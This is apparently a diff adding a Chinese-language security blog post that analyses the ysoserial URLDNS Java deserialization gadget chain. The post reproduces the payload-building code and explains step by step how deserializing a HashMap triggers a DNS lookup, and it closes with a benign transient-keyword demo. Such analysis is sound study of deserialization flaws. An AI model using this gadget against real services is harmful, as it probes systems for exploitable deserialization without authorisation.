@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Ysoserial-URLDNS ::
+        zrquan — share something
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content=""
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/ysoserial-urldns/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ysoserial-URLDNS"/>
+<meta name="twitter:description" content=""/>
+
+
+
+<meta property="og:title" content="Ysoserial-URLDNS" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/ysoserial-urldns/" />
+<meta property="article:published_time" content="2021-01-28T00:00:00+08:00" />
+<meta property="article:modified_time" content="2021-01-28T00:00:00+08:00" /><meta property="og:site_name" content="zrquan" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >cd /home/zrquan</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Menu
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/archive">Archive</a></li>
+              
+            
+              
+                <li><a href="/journal">Journal</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/journal">Journal</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Ysoserial-URLDNS</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-01-28
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/java/">#java</a>&nbsp;
+        
+          <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#构造-payload">构造 payload</a></li>
+<li><a href="#反序列化过程">反序列化过程</a></li>
+<li><a href="#transient-关键字">transient 关键字</a></li>
+</ul></li>
+</ul>
+</nav></aside>
+      
+      <p>URLDNS 是一个比较简单的 POP 链，而且只能发送 DNS 请求，不能直接 RCE，所以本来是不想写这篇文章的。不过完整学习了这个链的代码后，发现 ysoserial 的一些代码和技巧对于深入了解 Java 十分有帮助，还是有必要记录一下。</p>
+
+<h2 id="构造-payload">构造 payload</h2>
+
+<p>URLDNS 链通过反序列化 HashMap 对象来触发，获取恶意对象的 getObject 方法如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String url<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">//Avoid DNS resolution during payload creation
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span><span style="color:#75715e"></span>    URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler<span style="color:#f92672">();</span>
+
+    HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span> <span style="color:#75715e">// HashMap that will contain the URL
+</span><span style="color:#75715e"></span>    URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> url<span style="color:#f92672">,</span> handler<span style="color:#f92672">);</span> <span style="color:#75715e">// URL to use as the Key
+</span><span style="color:#75715e"></span>    ht<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>u<span style="color:#f92672">,</span> url<span style="color:#f92672">);</span> <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span><span style="color:#75715e"></span>
+    <span style="color:#75715e">//During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span><span style="color:#75715e"></span>    Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>u<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;hashCode&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">-</span>1<span style="color:#f92672">);</span>
+
+    <span style="color:#66d9ef">return</span> ht<span style="color:#f92672">;</span>
+<span style="color:#f92672">}</span></code></pre></div>
+<p>SilentURLStreamHandler 是一个静态内部类，继承 URLStreamHandler，并重写了 openConnection 和 getHostAddress 方法。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler <span style="color:#f92672">{</span>
+
+    <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span><span style="color:#f92672">(</span>URL u<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span></code></pre></div>
+<p>这个内部类的作用是用来避免漏洞误判，因为 payload 的构造过程中也会触发一次 DNS 请求，而我们希望 DNS 请求只在反序列化的过程中触发，以确定反序列化过程是否存在漏洞。</p>
+
+<p>那 SilentURLStreamHandler 是怎么阻止第一次 DNS 请求的呢？我们跟进到 <code>ht.put(u, url)</code> 中：</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_17-28-18_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>来到 <code>hashCode()</code> 方法，这里会对 hashCode 变量进行判断，如果不是 <code>-1</code> 的话会直接返回。因为 hashCode 的默认值就是 <code>-1</code> ，所以这里会调用 <code>handler.hashCode(this)</code> 。</p>
+
+<p>注意此时的 handler 是 SilentURLStreamHandler 的实例。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_17-39-27_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>执行到上图的 359 行，调用 getHostAddress 方法，如果此时的 handler 是 URLStreamHandler 类的实例，则会发起 DNS 请求来获取 IP。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_17-42-20_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>然而此时执行的是 <code>SilentURLStreamHandler.getHostAddress</code> ，直接返回 null，避免了在反序列化前发送 DNS 请求。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_17-46-37_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>执行 <code>ht.put(u, url)</code> 之后，URL 对象的 hashcode 会被修改，前面说过如果 hashCode 不是-1，会在 <code>handler.hashCode(this)</code> 前返回，所以我们要将它重新设成-1。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_17-53-18_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>至此我们构造了一个 HashMap 的实例，并将一个 URL 类的实例设置为它的 key；value 则是我们输入的 url，实际上 value 对利用过程没有影响，只要是能被序列化的类就行。</p>
+
+<h2 id="反序列化过程">反序列化过程</h2>
+
+<p>入口点和 <a href="/posts/ysoserial-hibernate1/">Hibernate1</a> 链一样，在 <code>HashMap.readObject</code> 中。在方法的最后，通过 for 循环获取每个 key 和 value，并调用了 <code>hash()</code> ：</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_18-09-48_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>接下来的执行过程和前面 <code>ht.put(u, url)</code> 差不多，因为前面通过反射机制重置了 hashCode，所以仍然进入到 <code>handler.hashCode()</code> 中。</p>
+
+<p>和之前一样执行到 getHostAddress 方法，但这次的 handler 并不是 SilentURLStreamHandler 的实例，因此顺利发送 DNS 请求。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_18-13-48_screenshot.png"   />
+    
+  </figure>
+
+
+
+<h2 id="transient-关键字">transient 关键字</h2>
+
+<p>反序列化时，handler 变量并不是 SilentURLStreamHandler 的实例，是因为 <code>URL.handler</code> 变量是用 transient 关键字修饰的。</p>
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_19-29-44_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>当序列化一个实现了 Serilizable 接口的类实例时，用 transient 修饰的变量不会被序列化。在实际的开发中，经常会用 transient 修饰一些敏感的数据(密码、证件号等)，避免将这些数据序列化后通过网络传输。</p>
+
+<p>以下示例代码使用 transient 修饰 User 类的 password 变量，序列化保存到文件后再反序列化获取 User 实例，此时输出的 password 为 null，因为该变量没有被序列化。</p>
+
+
+
+
+  <div class="collapsable-code">
+    <input id="524738196" type="checkbox" checked />
+    <label for="524738196">
+      <span class="collapsable-code__language">java</span>
+      <span class="collapsable-code__title">示例代码</span>
+      <span class="collapsable-code__toggle" data-label-expand="➕" data-label-collapse="➖"></span>
+    </label>
+    <pre class="language-java" ><code>
+
+public class demo {
+    public static void main(String[] args) {
+        User user = new User();
+        user.setName(&#34;zrquan&#34;);
+        user.setPassword(&#34;qwe123&#34;);
+
+        //序列化
+        try{
+            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(&#34;user.txt&#34;));
+            os.writeObject(user);
+            os.flush();
+            os.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        //反序列化
+        try{
+            ObjectInputStream is = new ObjectInputStream(new FileInputStream(&#34;user.txt&#34;));
+            user = (User) is.readObject();
+            is.close();
+
+            System.out.println(&#34;After unserialized: &#34;);
+            System.out.println(&#34;username: &#34; &#43; user.getName());
+            System.err.println(&#34;password: &#34; &#43; user.getPassword());
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+class User implements Serializable {
+    public String name;
+    private transient String password;
+
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getPassword() {
+        return password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+}
+
+</code></pre>
+  </div>
+
+
+
+
+  <figure class="left" >
+    <img src="/ox-hugo/2021-01-28_19-58-25_screenshot.png"   />
+    
+  </figure>
+
+
+
+<p>💡 使用 transient 要注意以下几点：</p>
+
+<ol>
+<li>被修饰的变量将不再是对象持久化的一部分，该变量的值在序列化后无法获取。</li>
+<li>只能修饰变量，不能修饰方法和类。且本地变量不能被修饰，只能修饰实现了 Serializable 接口的类的成员变量。</li>
+<li>静态变量不管是否被 transient 修饰，都不能被序列化。</li>
+<li>transient 用来避免实现了 Serilizable 接口的类的变量被序列化，对实现 Externalizable 接口的类没有影响。</li>
+</ol>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/ysoserial-hibernate1/">
+                  <span class="button__text">Ysoserial-Hibernate1</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "4shen0ne" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >cd /home/zrquan</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+        <span
+          >Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
